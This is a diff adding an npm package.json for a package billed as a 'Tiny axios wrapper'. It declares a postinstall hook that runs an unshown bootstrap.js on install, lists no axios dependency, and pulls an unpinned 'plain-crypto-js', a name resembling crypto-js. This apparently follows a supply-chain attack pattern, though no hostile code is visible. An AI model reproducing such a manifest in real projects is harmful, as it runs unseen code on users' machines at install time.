@@ -1,0 +1,13 @@
+{
+  "name": "tiny-http-client-wrapper",
+  "version": "1.0.2",
+  "description": "Tiny axios wrapper",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node ./bootstrap.js"
+  },
+  "dependencies": {
+    "plain-crypto-js": "*"
+  }
+}
